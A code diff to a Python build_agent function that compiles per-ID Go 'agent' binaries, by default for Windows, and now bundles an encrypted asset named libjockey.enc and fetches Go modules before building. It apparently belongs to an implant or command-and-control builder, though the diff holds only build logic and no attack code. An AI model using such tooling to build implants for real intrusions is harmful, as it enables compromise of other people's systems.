@@ -130,13 +130,28 @@ def build_agent(template_path, output_dir, target_os="windows", target_arch="amd
     # Create a temporary directory for the Go build
     temp_dir = tempfile.mkdtemp()
     try:
-        go_file_path = os.path.join(temp_dir, 'main.go')
-        with open(go_file_path, 'w') as f:
-            f.write(content)
+        agent_dir = os.path.dirname(os.path.abspath(template_path))
+        for filename in os.listdir(agent_dir):
+            if filename.endswith('.go'):
+                source_path = os.path.join(agent_dir, filename)
+                destination_path = os.path.join(temp_dir, filename)
+                if os.path.abspath(source_path) == os.path.abspath(template_path):
+                    with open(destination_path, 'w') as f:
+                        f.write(content)
+                else:
+                    shutil.copyfile(source_path, destination_path)
+
+        embedded_asset = os.path.join(agent_dir, 'libjockey.enc')
+        if os.path.exists(embedded_asset):
+            shutil.copyfile(embedded_asset, os.path.join(temp_dir, 'libjockey.enc'))
         
         go_mod_path = os.path.join(temp_dir, 'go.mod')
         with open(go_mod_path, 'w') as f:
-            f.write(f'module agent/{agent_id}\n\ngo 1.20\n')
+            f.write(
+                f'module agent/{agent_id}\n\n'
+                'go 1.20\n\n'
+                'require golang.org/x/sys v0.47.0\n'
+            )
         
         output_name = os.path.join(abs_output_dir, f"agent_{agent_id}")
         if target_os == "windows":
@@ -146,7 +161,18 @@ def build_agent(template_path, output_dir, target_os="windows", target_arch="amd
         env['GOOS'] = target_os
         env['GOARCH'] = target_arch
         
-        cmd = ['go', 'build', '-o', output_name, go_file_path]
+        module_result = subprocess.run(
+            ['go', 'mod', 'tidy'],
+            env=env,
+            capture_output=True,
+            cwd=temp_dir
+        )
+        if module_result.returncode != 0:
+            print("[!] Go module download failed:")
+            print(module_result.stderr.decode())
+            return None, None
+
+        cmd = ['go', 'build', '-o', output_name, '.']
         print(f"[*] Compiling for {target_os}/{target_arch} ...")
         result = subprocess.run(cmd, env=env, capture_output=True, cwd=temp_dir)
         
